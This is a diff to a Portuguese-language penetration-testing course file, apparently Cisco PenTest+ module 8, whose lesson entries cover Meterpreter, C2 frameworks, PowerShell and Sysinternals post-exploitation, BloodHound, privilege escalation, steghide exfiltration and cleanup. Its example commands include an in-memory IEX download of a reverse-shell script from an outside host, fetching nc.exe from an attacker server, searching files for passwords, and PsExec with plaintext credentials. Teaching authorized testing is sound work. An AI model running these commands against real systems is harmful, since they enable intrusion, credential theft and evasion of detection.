@@ -114,6 +114,13 @@ module_8_lessons = [
         "explanation": "A maioria dos firewalls de borda bloqueia qualquer conexão vinda de fora (Bind), mas permite que servidores internos façam conexões para a internet (Reverso)."
       },
       {
+        "type": "teach",
+        "icon": "fa-terminal",
+        "title": "O Payload Interativo Meterpreter (Cisco 8.1.4)",
+        "content": "O <b>Meterpreter</b> é o payload dinâmico e interativo mais poderoso do framework Metasploit. Ao contrário de uma shell simples, ele permite executar tarefas complexas de pós-exploração via comandos nativos de forma limpa:<br><br>• <b>`lpwd`</b>: Exibe o diretório de trabalho local na própria máquina de ataque do pentester.<br>• <b>`clearev`</b>: Limpa os logs de aplicativo, sistema e segurança no host remoto para apagar vestígios.<br>• <b>`hashdump`</b>: Despeja as senhas criptografadas (hashes) salvas na base SAM do Windows.<br>• <b>`recurso`</b>: Executa sequencialmente uma lista de comandos Meterpreter previamente salvos em um arquivo de texto.",
+        "highlight": "Meterpreter estende o acesso de uma shell comum e automatiza comandos de pós-exploração."
+      },
+      {
         "type": "match",
         "title": "Comandos Meterpreter (Cisco Tabela 8-3)",
         "pairs": [
@@ -139,8 +146,8 @@ module_8_lessons = [
         "type": "teach",
         "icon": "fa-server",
         "title": "Sistemas de Comando e Controle - C2 (Cisco 8.1.4)",
-        "content": "Atacantes avançados utilizam estruturas de <b>Comando e Controle (C2 / CnC)</b> para gerenciar sistemas invadidos. O C2 cria um <b>canal encoberto (covert channel)</b> para transferir dados de forma secreta sem levantar alertas nas políticas de segurança da rede.<br><br>Ativos de C2 podem ser servidores em nuvem, hosts comprometidos intermediários ou até tráfego disfarçado em redes sociais (Twitter, Dropbox).",
-        "highlight": "TrevorC2 e DNSCat2 são exemplos clássicos de C2 focados em evasão."
+        "content": "Atacantes avançados utilizam estruturas de <b>Comando e Controle (C2)</b> para manter canais encobertos. A Cisco destaca ferramentas com técnicas específicas de evasão:<br><br>• <b>`DNSCat2`</b>: Cria conexões cifradas disfarçadas sob consultas de DNS, burlando firewalls padrão.<br>• <b>`TrevorC2`</b>: Emprega Python e esconde o tráfego simulando navegação web HTTP normal.<br>• <b>`WMImplant`</b>: Baseado em PowerShell, ele abusa da infraestrutura WMI legítima do Windows como canal de comando.<br>• <b>`Twittor`</b>: Utiliza as mensagens diretas de redes sociais para emitir comandos e burlar detecção de rede.",
+        "highlight": "DNSCat2, TrevorC2, WMImplant e Twittor usam táticas diferentes para evadir detecção."
       },
       {
         "type": "match",
@@ -293,7 +300,7 @@ module_8_lessons = [
         "options": [
           "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
           "As conexões RDP não oferecem interface gráfica (GUI), limitando as ações a comandos CMD brutos.",
-          "O tráfego de rede RDP não aceita criptografia, permitindo que firewalls descubram senhas na rede facilmente."
+          "O tráfego de rede RDP não aceita criptografia, permitindo que firewalls descobram senhas na rede facilmente."
         ],
         "correctText": "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
         "explanation": "No Windows clássico de desktop, conectar via RDP derruba a sessão do usuário ativo ou exige autorização visual dele, expondo o atacante na hora."
@@ -312,6 +319,53 @@ module_8_lessons = [
         "scenario": "Para executar um script de backdoor sem baixar nenhum executável ou arquivo no HD da vítima, o atacante usa a diretiva IEX para baixar e rodar o script diretamente na memória RAM:",
         "code": "PS > IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/Invoke-PowerShellTcp.ps1')",
         "takeaway": "Como o arquivo PS1 roda direto na memória RAM, a análise de disco estática do antivírus não detecta a execução."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual é a principal característica que define a técnica de Living-off-the-Land (LOLBins) em um ataque cibernético ou simulação?",
+        "options": [
+          "O uso exclusivo de utilitários legítimos e comandos nativos já existentes no próprio sistema alvo.",
+          "A necessidade de formatar fisicamente o disco rígido do servidor comprometido.",
+          "O desenvolvimento de malwares binários extremamente pesados codificados em C++."
+        ],
+        "correctText": "O uso exclusivo de utilitários legítimos e comandos nativos já existentes no próprio sistema alvo.",
+        "explanation": "LOLBins evitam alertas do antivírus porque não introduzem novos arquivos executáveis estranhos; eles usam os binários confiáveis do próprio sistema (ex: PowerShell, WMI) para rodar o ataque."
+      },
+      {
+        "type": "fill",
+        "sentence": "Para forçar o download e a execução de um script diretamente na memória RAM da vítima sem salvar o arquivo no HD, os invasores utilizam o cmdlet de execução de expressões com a sigla ___.",
+        "options": [
+          "IEX",
+          "LS",
+          "CD"
+        ],
+        "correctText": "IEX",
+        "explanation": "IEX (Invoke-Expression) é comumente combinado com Net.WebClient.DownloadString para carregar e rodar códigos refletivamente na RAM."
+      }
+    ],
+    "victory_title": "Excelente!",
+    "victory_msg": "Você dominou os fundamentos de pivotagem, segmentação de rede e o conceito tático de Living off the Land (LOLBins)!"
+  },
+  {
+    "filename": "8.2b-powershell-sysinternals.html",
+    "module": "8",
+    "title": "Ferramentas Nativas: PowerShell e Sysinternals",
+    "victory_msg": "POWERSHELL E SYSINTERNALS DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-terminal",
+        "title": "Comandos PowerShell na Pós-Exploração (Cisco Tabela 8-4)",
+        "content": "No Windows, o <b>PowerShell</b> oferece recursos avançados para pós-exploração que vão muito além de listar arquivos. A Cisco destaca quatro comandos e cmdlets altamente práticos nesse estágio:<br><br>• <b>`Select-String`</b>: Funciona de forma similar ao `grep` do Linux. É excelente para vasculhar pastas de usuários ou backups buscando arquivos contendo termos como 'password' ou 'senha'.<br>• <b>`Get-HotFix`</b>: Retorna uma lista completa de correções e atualizações de segurança instaladas no S.O., ajudando o atacante a identificar falhas de kernel não corrigidas.<br>• <b>`Get-Process`</b>: Lista todos os processos ativos em execução no computador, permitindo auditar a presença de agentes de segurança (EDRs, Antivírus) ou sistemas críticos.<br>• <b>`DownloadFile`</b>: Um método da classe `Net.WebClient` usado para baixar binários adicionais da web via HTTP, funcionando como o utilitário `wget` do Linux.",
+        "highlight": "Esses comandos nativos fornecem informações riquíssimas sem levantar os alarmes normais de arquivos maliciosos."
+      },
+      {
+        "type": "example",
+        "icon": "fa-code",
+        "title": "Prática - Executando Cmdlets PowerShell na Pós-Exploração",
+        "scenario": "Para localizar senhas em arquivos de texto no diretório de usuários ou baixar uma ferramenta utilitária como o netcat sem usar o navegador, o testador roda:",
+        "code": "# 1. Buscando a palavra 'password' em arquivos TXT de usuários:\nPS > Select-String -path c:\\users\\*.txt -pattern password\n\n# 2. Baixando a ferramenta netcat do servidor do atacante:\nPS > (New-Object System.Net.WebClient).DownloadFile('http://10.1.2.3/nc.exe', 'nc.exe')\n\n# 3. Verificando as correções e atualizações de segurança instaladas:\nPS > Get-HotFix",
+        "takeaway": "Com esses três comandos nativos, você localiza senhas, audita falhas e puxa payloads adicionais de forma ágil."
       },
       {
         "type": "match",
@@ -336,21 +390,30 @@ module_8_lessons = [
         ]
       },
       {
-        "type": "teach",
-        "icon": "fa-folder-open",
-        "title": "PowerSploit, Empire e BloodHound (Cisco 8.2.3)",
-        "content": "A pós-exploração corporativa conta com arsenais potentes baseados em PowerShell:<br><br>🛠️ <b>PowerSploit</b>: Módulos como `Invoke-Mimikatz` (carrega Mimikatz 2.0 refletivamente na RAM para extrair senhas do LSASS) e `Invoke-NinjaCopy` (copia arquivos de volumes NTFS brutos contornando travas do S.O.).<br><br>👑 <b>Empire</b>: Framework C2 open source que roda agentes PowerShell de forma evasiva.<br><br>🩸 <b>BloodHound</b>: Software JS de página única que usa <b>Teoria dos Grafos</b> para mapear relacionamentos do Active Directory e revelar caminhos ocultos de ataque."
+        "type": "quiz",
+        "task": "Suponha que você comprometeu um host Windows e precisa buscar credenciais vazadas em arquivos locais de backup. Qual cmdlet PowerShell nativo é o mais adequado e eficiente para buscar o padrão 'senha' ou 'password' em múltiplos arquivos?",
+        "options": [
+          "Select-String",
+          "Get-HotFix",
+          "Get-Process"
+        ],
+        "correctText": "Select-String",
+        "explanation": "Select-String busca por padrões de texto (incluindo expressões regulares) dentro de arquivos, atuando de forma análoga ao comando grep do Linux."
       },
       {
-        "type": "quiz",
-        "task": "Qual framework C2 de código aberto permite executar agentes e payloads pós-exploração em máquinas Windows e Linux sem a necessidade do powershell.exe?",
-        "options": [
-          "Empire",
-          "Nmap",
-          "Ettercap"
-        ],
-        "correctText": "Empire",
-        "explanation": "O Empire provê agentes muito eficientes baseados em PowerShell para Windows e Python para Linux, focados em modularidade e evasão."
+        "type": "teach",
+        "icon": "fa-toolbox",
+        "title": "Conjunto de Ferramentas Sysinternals (Cisco 8.2.3)",
+        "content": "A suíte <b>Sysinternals</b> da Microsoft é uma coleção de utilitários legítimos projetada para gerenciamento do sistema. Em pós-exploração, ela é valiosa por ser operada totalmente via linha de comando e interagir de forma robusta com o sistema remoto:<br><br>• <b>`PsExec`</b>: Permite executar processos remotamente de forma nativa. O atacante pode usá-lo para rodar scripts ou cmd.exe na máquina da vítima, com a vantagem de que a saída do comando é redirecionada direto para o terminal do atacante.<br>• <b>`PsGetSid`</b>: Exibe o Identificador de Segurança (SID) de usuários locais e de domínio, vital para ataques de elevação de privilégios ou persistência.<br>• <b>`PsLoggedOn`</b>: Exibe uma lista em tempo real de todas as contas de usuários atualmente ativas e logadas no host alvo.<br>• <b>`PsFile`</b>: Mostra quais arquivos do sistema estão atualmente abertos e sendo compartilhados na rede.",
+        "highlight": "Ferramentas Sysinternals rodam de forma limpa e são assinadas pela própria Microsoft, o que dificulta o bloqueio simples por antivírus."
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Prática - Sysinternals em Ação com PsExec (Cisco 8.2.3)",
+        "scenario": "Para rodar comandos de prompt silenciosamente no alvo (10.1.2.3) e ver os resultados em sua própria tela, o pentester executa o utilitário PsExec fornecendo credenciais de rede:",
+        "code": "C:\\> psexec \\\\10.1.2.3 -u Administrator -p P@ssw0rd1 cmd.exe\n\nConnecting to 10.1.2.3...\nStarting PsExec service on 10.1.2.3...\n\nMicrosoft Windows [Version 10.0.19044]\nC:\\Windows\\system32>",
+        "takeaway": "O PsExec instala temporariamente um pequeno serviço no alvo, executa o comando e depois o desinstala de forma higiênica."
       },
       {
         "type": "match",
@@ -386,76 +449,83 @@ module_8_lessons = [
         "explanation": "O cmdlet Enable-PSRemoting configura o WinRM para aceitar conexões administrativas remotas via PowerShell."
       }
     ],
-    "victory_title": "Excelente!",
-    "victory_msg": "Você aprendeu a saltar entre sistemas com pivotagem, usar utilitários legítimos (LOLBins) e varrer mídias e AD com BloodHound e Sysinternals!"
+    "victory_title": "Parabéns!",
+    "victory_msg": "Você dominou o uso prático de cmdlets PowerShell ofensivos e a poderosa suíte Sysinternals da Microsoft!"
   },
   {
-    "filename": "8.2b-escalada-limpeza.html",
+    "filename": "8.2c-escalada-limpeza.html",
     "module": "8",
     "title": "Elevação de Acesso, Higienização e Evasão Esteganográfica",
     "victory_msg": "MÓDULO 8 CONCLUÍDO COM MAESTRIA!",
     "steps": [
       {
         "type": "teach",
-        "icon": "fa-angles-up",
-        "title": "Escalada de Privilégios (Cisco 8.2.5)",
-        "content": "Ao obter o acesso inicial a uma máquina, o pentester geralmente ganha uma conta comum de baixas permissões. A <b>Escalada de Privilégios</b> é o abuso de falhas para acessar recursos restritos.<br><br>↕️ <b>Escalada Vertical</b>: Ocorre quando um usuário comum obtém privilégios de alto nível hierárquico (ex: o usuário `derek` vira `root` ou `SYSTEM`).<br><br>↔️ <b>Escalada Horizontal</b>: Acessar dados de contas de mesmo nível de privilégio (ex: mudar IDs de faturas ou ler posts privados de terceiros em fóruns).",
-        "highlight": "A escalada de privilégios demonstra as falhas internas de autorização e controle de acessos da máquina."
+        "icon": "fa-sitemap",
+        "title": "Mapeando o Domínio: PowerSploit, Empire e BloodHound (Cisco 8.2.3)",
+        "content": "A pós-exploração em redes corporativas com Active Directory (AD) utiliza ferramentas sofisticadas de automação:<br><br>• <b>`BloodHound`</b>: É uma aplicação web de página única (Javascript) que utiliza <b>Teoria dos Grafos</b> para mapear visualmente todas as relações complexas no Active Directory (usuários, grupos, computadores, permissões). Ele revela caminhos ocultos de ataque, mostrando exatamente qual sequência de computadores e contas um invasor deve comprometer para se tornar Administrador de Domínio.<br>• <b>`Empire`</b>: Um framework de comando e controle (C2) open source extremamente modular que permite gerenciar agentes PowerShell e Python. Ele executa payloads pós-exploração diretamente na memória RAM, sem a necessidade de chamar o binário `powershell.exe`, o que burla muitos mechanisms de monitoramento.<br>• <b>`PowerSploit`</b>: Uma coleção clássica de scripts ofensivos que facilitam tarefas como carregar o Mimikatz diretamente na memória RAM (`Invoke-Mimikatz`) para despejar senhas salvas, ou ler arquivos brutos particionados em NTFS (`Invoke-NinjaCopy`).",
+        "highlight": "Essas ferramentas mapeiam e automatizam a exploração de domínios corporativos inteiros de forma extremamente avançada."
       },
       {
         "type": "quiz",
-        "task": "Você acessa a sua conta de usuário no Pixel Paradise e percebe que as faturas são acessadas por um ID numérico na URL: 'raccount?id=1050'. Ao alterar manualmente para '1051', você tem acesso completo à fatura privada de outro usuário comum. Que tipo de falha pedagógica isso representa?",
+        "task": "Qual é a principal inovação metodológica trazida pelo utilitário BloodHound para o mapeamento e a exploração de redes baseadas em Microsoft Active Directory?",
         "options": [
-          "Escalada de privilégios horizontal (abuso de autorização lateral).",
-          "Escalada de privilégios vertical (escalada direta para root).",
-          "Ataque cinético industrial SCADA/Modbus."
+          "O uso da Teoria dos Grafos para revelar caminhos ocultos de ataque a partir de relações de permissão entre usuários, grupos e computadores.",
+          "A criação de firewalls virtuais de microsegmentação automatizados na infraestrutura do cliente.",
+          "A quebra por força bruta ultrarrápida de hashes NTLMv2 capturados no tráfego SMB."
         ],
-        "correctText": "Escalada de privilégios horizontal (abuso de autorização lateral).",
-        "explanation": "Você não virou administrador geral, mas acessou dados sensíveis de outro usuário com o mesmo nível de privilégios (Broken Object Level Authorization - BOLA / IDOR)."
+        "correctText": "O uso da Teoria dos Grafos para revelar caminhos ocultos de ataque a partir de relações de permissão entre usuários, grupos e computadores.",
+        "explanation": "Ao mapear permissões como nós e arestas de um grafo, o BloodHound expõe graficamente caminhos de escalada complexos de 'Usuário Comum' até 'Domain Admin'."
       },
       {
         "type": "teach",
-        "icon": "fa-broom",
-        "title": "Como Cobrir Rastros e Limpar Sistemas (Cisco 8.2.7)",
-        "content": "Ao término do pentest, é vital limpar o ambiente para retornar todos os sistemas do cliente ao estado original de integridade:<br><br>🧼 <b>Processo de Limpeza</b>:<br>• Excluir todas as contas de usuário criadas para o teste.<br>• Excluir todos os scripts, backdoors, daemons, binários e arquivos temporários.<br>• Restaurar cabeçalhos, logs de auditoria e configurações originais.<br>• Seguir as diretrizes da publicação do <b>NIST SP 800-88 Rev 1 (Media Sanitization)</b> para higienizar mídias com segurança.",
-        "highlight": "Todo processo e limite de limpeza deve ser detalhado previamente no documento de Regras de Engajamento (ROE)."
+        "icon": "fa-angles-up",
+        "title": "Escalada de Privilégios (Cisco 8.2.5)",
+        "content": "A escalada de privilégios consiste em explorar brechas em serviços locais, kernel ou configurações incorretas para obter mais permissões do que a conta inicial possuía. Ela é dividida em dois eixos:<br><br>↕️ <b>Escalada Vertical</b>: Ocorre quando um usuário de baixo nível obtém acesso a uma conta com poderes administrativos superiores (ex: o usuário comum vira `root` no Linux ou `SYSTEM`/`Administrator` no Windows).<br><br>↔️ <b>Escalada Horizontal</b>: Ocorre quando um usuário acessa recursos ou executa funções pertencentes a outros usuários que possuem o <b>mesmo nível de privilégio</b> hierárquico (ex: acessar a fatura privada de outro cliente ou ler mensagens pessoais de outra conta comum).",
+        "highlight": "A escalada demonstra se um atacante pode tomar controle integral do sistema operacional ou violar a privacidade dos usuários."
       },
       {
         "type": "quiz",
-        "task": "Em qual etapa do engajamento de teste de penetração o auditor deve discutir e documentar junto ao cliente os processos de limpeza e remoção de dados das máquinas de ataque?",
+        "task": "Durante um teste web em um e-commerce, você percebe que ao visualizar o seu perfil de usuário comum, a URL exibe 'perfil?usuario_id=9870'. Se você alterar o ID manualmente para '9871' e conseguir visualizar e editar todas as informações privadas e endereços de outro cliente comum, que tipo de escalada de privilégios ocorreu?",
         "options": [
-          "Na fase de pré-engajamento, documentando tudo no documento de Regras de Engajamento (Rules of Engagement - ROE).",
-          "Apenas no último dia dos testes, decidindo os métodos por conta própria.",
-          "O pentester não deve realizar a limpeza das ferramentas, deixando isso a cargo do time de TI do cliente."
+          "Escalada de privilégios horizontal (abuso de autorização lateral entre mesmos níveis de privilégio).",
+          "Escalada de privilégios vertical (obtenção direta de acesso administrative SYSTEM).",
+          "Ataque de negação de serviço distribuído (DDoS) para derrubar o servidor."
         ],
-        "correctText": "Na fase de pré-engajamento, documentando tudo no documento de Regras de Engajamento (Rules of Engagement - ROE).",
-        "explanation": "Para evitar a perda não intencional de dados produtivos do cliente e garantir transparência legal, os limites e autorizações de limpeza devem constar nas regras de engajamento (ROE)."
+        "correctText": "Escalada de privilégios horizontal (abuso de autorização lateral entre mesmos níveis de privilégio).",
+        "explanation": "Você não virou administrador geral do sistema, mas conseguiu invadir e modificar o espaço de dados de outro usuário com o mesmo nível de permissão (falha conhecida como IDOR/BOLA)."
       },
       {
         "type": "teach",
         "icon": "fa-file-image",
         "title": "Esteganografia com a ferramenta Steghide (Cisco 8.2.7)",
-        "content": "Os atacantes (e pentesters para demonstrar a exfiltração silenciosa) utilizam <b>Esteganografia</b> para ocultar dados secretos dentro de mídias inocentes (como arquivos JPG, BMP ou WAV). Isso evita que os sensores corporativos de DLP (Data Loss Prevention) detectem o vazamento.<br><br>A ferramenta clássica para isso no Kali Linux é o <b>steghide</b>, que permite embutir e extrair payloads criptografando a carga com uma frase secreta.",
+        "content": "A <b>Esteganografia</b> é a arte e ciência de ocultar a própria existência de uma mensagem secreta dentro de outra mídia inocente, como arquivos de imagem (`.jpg`, `.bmp`) ou áudio (`.wav`).<br><br>🔒 <b>Uso Prático</b>: Em testes de segurança, é empregada para demonstrar como invasores podem realizar a <b>Exfiltração de Dados</b> confidenciais de forma silenciosa, burlando detectores automáticos de DLP (Data Loss Prevention) instalados na rede do cliente.<br><br>No Kali Linux, a ferramenta clássica para embutir e extrair payloads de forma simples e criptografada é o <b>`steghide`</b>.",
         "highlight": "Esteganografia esconde a própria existência da informação secreta dentro de outra mídia."
       },
       {
         "type": "example",
         "icon": "fa-terminal",
         "title": "Prática - Ocultando e Extraindo com Steghide (Cisco 8.2.8)",
-        "scenario": "Para demonstrar a exfiltração de um documento secreto ('segredo.txt') oculto dentro de uma foto inocente ('foto.jpg') e extraí-lo do outro lado, o pentester roda os seguintes comandos no terminal:",
-        "code": "# 1. Embutindo o arquivo secreto na foto de cobertura:\n$ steghide embed -cf foto.jpg -ef segredo.txt -p 'cyberduo123'\n\n# 2. Extraindo o arquivo secreto da foto contaminada:\n$ steghide extract -sf foto.jpg -p 'cyberduo123'",
-        "takeaway": "-cf define o arquivo de cobertura (cover), -ef define o arquivo embutido e -sf define o stego-file."
+        "scenario": "Para ocultar um arquivo confidencial contendo senhas vazadas ('segredo.txt') dentro de uma imagem de cobertura de férias ('foto.jpg'), e depois recuperá-lo no host do atacante, executa-se:",
+        "code": "# 1. Embutindo o arquivo secreto na foto de cobertura (-cf = cover file, -ef = embed file):\n$ steghide embed -cf foto.jpg -ef segredo.txt -p 'cyberduo123'\n\n# 2. Extraindo o arquivo secreto da imagem contaminada (-sf = stego file):\n$ steghide extract -sf foto.jpg -p 'cyberduo123'",
+        "takeaway": "O resultado do comando embed gera um arquivo idêntico visualmente à foto original, mas com os dados ocultos."
       },
       {
         "type": "fill",
-        "sentence": "No steghide, para embutir dados, o parâmetro que aponta para o arquivo que carrega a mensagem oculta (ex: segredo.txt) é o -ef, e o parâmetro que aponta para a imagem ou vídeo original de cobertura é o ___.",
+        "sentence": "No utilitário steghide, o parâmetro que especifica o arquivo de cobertura ou disfarce original (como foto.jpg) é o ___, enquanto o parâmetro para extrair os dados do arquivo esteganográfico é o -sf.",
         "options": [
           "-cf",
-          "-sf",
+          "-ef",
           "-p"
         ],
         "correctText": "-cf",
-        "explanation": "-cf representa o 'cover file' (a mídia legítima de disfarce) e -ef representa o 'embed file' (a carga de dados confidenciais)."
+        "explanation": "O parâmetro -cf define o 'cover file' (a mídia inocente que servirá de disfarce) e -ef aponta para o 'embedded file' (o payload secreto)."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-broom",
+        "title": "Como Cobrir Rastros e Limpar Sistemas (Cisco 8.2.7)",
+        "content": "Após concluir com sucesso os testes de penetração, o pentester deve <b>limpar e higienizar todos os sistemas afetados</b> para devolvê-los exatamente ao estado de integridade e disponibilidade em que os encontrou:<br><br>🧼 <b>Etapas de Limpeza Críticas</b>:<br>• Excluir todas as contas locais e de domínio criadas para o teste.<br>• Remover todas as ferramentas, scripts, daemons e arquivos de backdoor instalados nos discos.<br>• Restaurar configurações de rede, portas de firewall e logs originais.<br>• Seguir as diretrizes internacionais da publicação <b>NIST SP 800-88 Rev 1 (Guidelines for Media Sanitization)</b> para destruir dados de testes em mídias de armazenamento com segurança total, impedindo a recuperação de informações confidenciais do cliente.",
+        "highlight": "A limpeza é uma obrigação ética e profissional. Deixar ferramentas instaladas no cliente é um risco severo de brecha de segurança real!"
       },
       {
         "type": "match",
@@ -478,6 +548,17 @@ module_8_lessons = [
             "definition": "Garantir que nenhum serviço ou porta dos fundos continue ativa"
           }
         ]
+      },
+      {
+        "type": "quiz",
+        "task": "Em qual etapa do planejamento do teste de penetração o auditor deve discutir, alinhar e documentar junto ao cliente os critérios exatos e autorizações para limpeza de sistemas e remoção de dados pós-teste?",
+        "options": [
+          "Na fase de pré-engajamento, formalizando tudo nas Regras de Engajamento (Rules of Engagement - ROE).",
+          "Durante a execução da pós-exploração, decidindo na hora conforme julgar conveniente.",
+          "Essa atividade não deve ser discutida com o cliente, ficando a cargo exclusivo da equipe de TI dele."
+        ],
+        "correctText": "Na fase de pré-engajamento, formalizando tudo nas Regras de Engajamento (Rules of Engagement - ROE).",
+        "explanation": "Para proteger a responsabilidade jurídica e garantir que sistemas de produção não sejam danificados durante a limpeza, todas as diretrizes e limites devem constar no ROE."
       }
     ],
     "victory_title": "PARABÉNS! ACESSO E EXFILTRAÇÃO DOMINADOS!",
